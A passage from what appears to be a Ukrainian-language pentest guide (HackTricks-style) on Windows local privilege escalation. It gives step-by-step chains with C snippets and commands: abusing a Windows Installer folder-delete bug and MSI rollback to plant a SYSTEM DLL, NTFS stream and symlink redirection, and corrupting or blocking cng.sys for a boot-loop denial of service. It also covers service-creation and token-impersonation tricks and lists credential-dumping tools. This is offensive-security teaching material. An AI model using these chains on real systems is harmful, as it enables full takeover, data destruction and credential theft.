Після `MsiBeginTransactionW` метод `SetEEUIDirectoryAndFilter` планує очищення шляху як папки, незалежно від аргументу фільтра, переданого клієнтом. Служба записує іменоване значення `REG_DWORD` у `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ім’я значення — це шлях, контрольований клієнтом, а дані `0x00000002` позначають папку. Потім `CleanupTempPackages(NULL, FALSE)` безпосередньо запускає очищення. Його привілейований робочий процес перелічує значення реєстру й передає записи папок рекурсивній функції `FDeleteFolder`, не перевіряючи походження шляхів. Якщо звичайне видалення не вдається, код також викликає `LockdownPath`, скидає атрибути файлу й повторює спробу.<sup>[[41]](#references)</sup>

Мінімальна послідовність викликів, відновлена з `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Корисний примітив — повторне використання шляху, а не перенаправлення через junction. Зареєструйте створений зловмисником `C:\Config.Msi`, видаліть його й дозвольте Windows Installer пізніше створити той самий шлях знову, уже із захищеними даними rollback. Під час очищення довіряє застарілому імені `TempPackages` і видаляє новий каталог від імені SYSTEM. Це обходить задуманий захист `FILE_FLAG_OPEN_REPARSE_POINT` і механізм пом’якшення ризику через довіру до перенаправлення, оскільки reparse point не потрібен.<sup>[[41]](#references)</sup>

Цей примітив видалення вписується в наведений нижче ланцюжок rollback: збережіть окремий запис `Installer\Folders`, видаліть захищений `C:\Config.Msi`, створіть його знову з NULL DACL і збережіть дескриптор із правом `WRITE_DAC`, відкритий до того, як інсталятор посилить DACL. Попередньо відкритий дескриптор може відновити дозвільну DACL за допомогою `NtSetSecurityObject`, після чого згенерований `.rbs` можна замінити до продовження rollback.<sup>[[41]](#references)</sup>

Microsoft виправила цей шлях, заборонивши `CMsiTransaction::SetEEUIDirectoryAndFilter` викликати `ScheduleFileOrFolderDelete`, коли ввімкнено новий feature gate. Виклик COM усе ще може повертати успіх, але шлях, контрольований зловмисником, більше не додається до `TempPackages`. Застосуйте оновлення системи безпеки Windows за квітень 2025 року замість того, щоб перевіряти наявність виправлення за успішним поверненням методу.<sup>[[41]](#references)[[42]](#references)</sup>

Коротко, техніка така:

1. **Етап 1 — Підготовка до перехоплення (залиште `C:\Config.Msi` порожнім)**

- Крок 1: Установіть MSI
    - Створіть `.msi`, який установлює нешкідливий файл (наприклад, `dummy.txt`) у доступну для запису папку (`TARGETDIR`).
    - Позначте інсталятор як **"UAC Compliant"**, щоб його міг запустити **користувач без прав адміністратора**.
    - Залиште відкритим **дескриптор** файлу після встановлення.

- Крок 2: Почніть видалення
    - Видаліть той самий `.msi`.
    - Процес видалення почне переміщувати файли до `C:\Config.Msi` і перейменовувати їх на файли `.rbf` (резервні копії для rollback).
    - **Перевіряйте відкритий дескриптор файлу** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: Користувацька синхронізація
    - `.msi` містить **користувацьку дію видалення (`SyncOnRbfWritten`)**, яка:
        - Повідомляє, коли файл `.rbf` записано.
        - Потім **чекає** на іншу подію перед продовженням видалення.

- Крок 4: Заблокуйте видалення `.rbf`
    - Отримавши сигнал, **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **не дасть його видалити**.
    - Потім **надішліть сигнал у відповідь**, щоб видалення могло завершитися.
    - Windows Installer не зможе видалити `.rbf`, і оскільки йому не вдасться видалити весь вміст, **`C:\Config.Msi` не буде видалено**.

- Крок 5: Видаліть `.rbf` вручну
    - Ви (зловмисник) вручну видаляєте файл `.rbf`.
    - Тепер **`C:\Config.Msi` порожній і готовий до перехоплення**.

> На цьому етапі **активуйте вразливість довільного видалення папки з рівнем SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 — Заміна скриптів rollback шкідливими**

- Крок 6: Створіть `C:\Config.Msi` з послабленими ACL
    - Самостійно створіть папку `C:\Config.Msi` знову.
    - Установіть **послаблені DACL** (наприклад, Everyone:F) і **залиште відкритим дескриптор** із правом `WRITE_DAC`.

- Крок 7: Запустіть інше встановлення
    - Знову встановіть `.msi`, задавши:
        - `TARGETDIR`: доступне для запису розташування.
        - `ERROROUT`: змінну, яка спричиняє примусову помилку.
    - Це встановлення буде використано, щоб знову запустити **rollback**, який читає `.rbs` і `.rbf`.

- Крок 8: Стежте за появою `.rbs`
    - Використовуйте `ReadDirectoryChangesW`, щоб стежити за `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
    - Зафіксуйте його ім’я.

- Крок 9: Синхронізуйтеся перед rollback
    - `.msi` містить **користувацьку дію встановлення (`SyncBeforeRollback`)**, яка:
        - Подає сигнал події, коли створено `.rbs`.
        - Потім **чекає** перед продовженням.

- Крок 10: Повторно застосуйте послаблені ACL
    - Після отримання події `.rbs created`:
        - Windows Installer **повторно застосовує суворі ACL** до `C:\Config.Msi`.
        - Але оскільки у вас усе ще є дескриптор із правом `WRITE_DAC`, ви можете **знову застосувати послаблені ACL**.

> ACL **перевіряються лише під час відкриття дескриптора**, тому ви все ще можете записувати до папки.

- Крок 11: Розмістіть підроблені `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **підробленим скриптом rollback**, який наказує Windows:
        - Відновити ваш файл `.rbf` (шкідливу DLL) у **привілейоване розташування** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Розмістіть підроблений `.rbf` зі **шкідливою DLL-корисним навантаженням рівня SYSTEM**.

- Крок 12: Запустіть rollback
    - Подайте сигнал події синхронізації, щоб інсталятор продовжив роботу.
    - **Користувацька дія типу 19 (`ErrorOut`)** налаштована на **навмисне завершення встановлення з помилкою** у відомий момент.
    - Це запускає **rollback**.

- Крок 13: SYSTEM установлює вашу DLL
    - Windows Installer:
        - Читає вашу шкідливу `.rbs`.
        - Копіює DLL із вашого `.rbf` у цільове розташування.
    - Тепер ваша **шкідлива DLL міститься в шляху, з якого її завантажує SYSTEM**.

- Фінальний крок: Виконайте код від імені SYSTEM
    - Запустіть довірений **автоматично підвищений бінарний файл** (наприклад, `osk.exe`), який завантажує перехоплену DLL.
    - **Готово**: ваш код виконується **від імені SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлів до підвищення привілеїв до SYSTEM

Основна техніка MSI rollback (попередня) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша вразливість дозволяє лише **довільне видалення файлів**?

Можна скористатися **внутрішньою будовою NTFS**: у кожної папки є прихований альтернативний потік даних із назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** каталогу.

Тож якщо **видалити потік `::$INDEX_ALLOCATION`** каталогу, NTFS **видалить увесь каталог** із файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Хоча ви викликаєте API видалення *файлу*, воно **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої зловмисником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- **Oplock** призупиняє виконання, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він дійде до `file1.txt`, **oplock спрацює** і передасть керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
    - Це спорожнить `folder1`, не перериваючи oplock.
    - Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Варіант C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Це націлено на внутрішній потік NTFS, у якому зберігаються метадані папки: його видалення видаляє папку.

5. Крок 5: Зняти oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction і symlink фактично видаляється:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видаляється від імені SYSTEM.

### Від створення довільної папки до постійної DoS-атаки

Скористайтеся примітивом, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з іменем **критичного драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо ви **заздалегідь створите його як папку**, Windows не зможе завантажити фактичний драйвер під час запуску.
- Потім Windows намагається завантажити `cng.sys` під час запуску.
- Виявляє папку, **не може знайти фактичний драйвер** і **аварійно завершує роботу або зупиняє завантаження**.
- Немає **резервного варіанта** і **відновлення** без зовнішнього втручання (наприклад, відновлення завантаження або доступу до диска).

### Від привілейованих шляхів журналів/резервних копій + OM symlinks до довільного перезапису файлів / DoS завантаження

Коли **привілейована служба** записує журнали/експорти за шляхом, зчитаним із **доступної для запису конфігурації**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис файлів (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Вимоги**
- Конфігурація, у якій зберігається цільовий шлях, доступна зловмиснику для запису (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити точку монтування в `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, яка записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб визначити шлях до привілейованого журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише журнал (наприклад, адміністратор запускає «надіслати тестове SMS»). Тепер запис потрапляє до `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписаний файл (за допомогою hex/PE-парсера), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити підмінений драйвер → **DoS із циклом перезавантаження**. Це також стосується будь-якого захищеного файла, який привілейована служба відкриває для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія є в `C:\Windows\System32\cng.sys`, її можуть спробувати завантажити першою, що робить її надійною ціллю для DoS із пошкодженими даними.



## **Від High Integrity до SYSTEM**

### **Нова служба**

Якщо ви вже працюєте в процесі з рівнем High Integrity, **шлях до SYSTEM** може бути простим: **створіть і запустіть нову службу**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Створюючи бінарний файл служби, переконайтеся, що це коректна служба або що бінарний файл швидко виконує необхідні дії, оскільки його буде завершено через 20 секунд, якщо це некоректна служба.

### AlwaysInstallElevated

З процесу з високим рівнем цілісності можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Докладніше про ключі реєстру та встановлення пакета _.msi_ можна прочитати тут.](#alwaysinstallelevated)

### Від High + SeImpersonate до System

**Код можна** [**знайти тут**](seimpersonate-from-high-to-system.md)**.**

### Від SeDebug + SeImpersonate до повних привілеїв токена

Якщо ви маєте ці привілеї токена (імовірно, ви знайдете їх у вже запущеному процесі з високим рівнем цілісності), то зможете за допомогою привілею SeDebug **відкрити майже будь-який процес** (крім захищених процесів), **скопіювати токен** процесу та створити **довільний процес із цим токеном**.\
Цей прийом зазвичай полягає у **виборі будь-якого процесу, запущеного від SYSTEM з усіма привілеями токена** (_так, можна знайти процеси SYSTEM без усіх привілеїв токена_).\
**Приклад виконання запропонованого прийому можна** [**знайти тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цей прийом використовує meterpreter для підвищення привілеїв у `getsystem`. Він полягає у **створенні pipe, а потім створенні або використанні служби для запису в цей pipe**. Після цього **сервер**, який створив pipe, використовуючи привілей **`SeImpersonate`**, зможе **імперсонувати токен** клієнта pipe (служби) й отримати привілеї SYSTEM.\
Щоб [**дізнатися більше про name pipes, прочитайте це**](#named-pipe-client-impersonation).\
Щоб ознайомитися з прикладом того, [**як перейти від високого рівня цілісності до System за допомогою name pipes, прочитайте це**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити dll**, яку **завантажує** **процес**, запущений від **SYSTEM**, ви зможете виконати довільний код із відповідними правами. Тому Dll Hijacking також корисний для такого підвищення привілеїв; крім того, його **набагато легше виконати з процесу з високим рівнем цілісності**, оскільки він матиме **права на запис** у папки, які використовуються для завантаження dll.\
**Докладніше про Dll hijacking можна** [**дізнатися тут**](dll-hijacking/index.html)**.**

### **Від Administrator або Network Service до System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Від LOCAL SERVICE або NETWORK SERVICE до повних привілеїв

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє помилки конфігурації та конфіденційні файли (**[**див. тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявляється.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє деякі можливі помилки конфігурації та збирає інформацію (**[**див. тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє помилки конфігурації**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію про сеанси PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Для локального запуску використовуйте -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявляється.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розпилює зібрані паролі по домену**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент PowerShell для спуфінгу ADIDNS/LLMNR/mDNS та атак типу man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове перерахування Windows для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей privesc (ЗАСТАРІЛИЙ, замінений на Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей privesc (потрібно скомпілювати за допомогою VisualStudio) ([**попередньо скомпільований файл**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост у пошуках помилок конфігурації (це радше інструмент для збору інформації, ніж privesc) (потрібно скомпілювати) **(**[**попередньо скомпільований файл**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (попередньо скомпільований exe у github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевіряє помилки конфігурації (попередньо скомпільований виконуваний файл у github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевіряє можливі помилки конфігурації (exe на Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для коректної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Зчитує результат **systeminfo** і рекомендує робочі експлойти (локальний Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Зчитує результат **systeminfo** і рекомендує робочі експлойти (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати проєкт за допомогою відповідної версії .NET ([див. тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену на хості жертви версію .NET, виконайте:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Основи ескалації привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв через використання слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Ескалація привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — практичний курс з локальної ескалації привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — атаки на Windows: AT — це новий чорний (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Ескалація привілеїв — Windows — повний посібник з OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — ескалація привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник з ескалації привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список з ескалації привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Ескалація привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи ескалації привілеїв у Windows для пентестерів](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA по SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: витік через format string + stack BOF → VirtualAlloc ROP (RCE) і крадіжка kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — переслідування Silver Fox: гра в кота й мишу в тінях ядра](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — уразливість файлової системи з підвищеними привілеями в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти для тестування символічних посилань — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Повернення в минуле. Зловживання символічними посиланнями у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js: небезпечне падіння довіри — небезпечне розв’язання модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — розв’язання завдань із контрольного списку C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — перехоплення бінарних файлів служб](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own із Microslop: ланцюжок уразливостей CLDFLT і перегонів у ядрі DirectX для локальної ескалації привілеїв у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одне I/O Ring, щоб правити всіма: повноцінний примітив читання/запису у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для ескалації привілеїв та інші чудові хитрощі](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойту FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, локальна ескалація привілеїв у Windows 10, що стала відома за день до виправлення](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: вивчення Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — обмежене делегування Kerberos на основі ресурсів: як зміна образу призводить до ескалації привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — отримання приватних SSH-ключів з агента SSH у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — перетворення серверів корпоративних оновлень на фабрики бекдорів (0_o) — частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — перетворення серверів корпоративних оновлень на фабрики бекдорів (0_o) — частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — ескалація привілеїв через видалення папки Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — повне відновлення: простеження шляху назад до NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
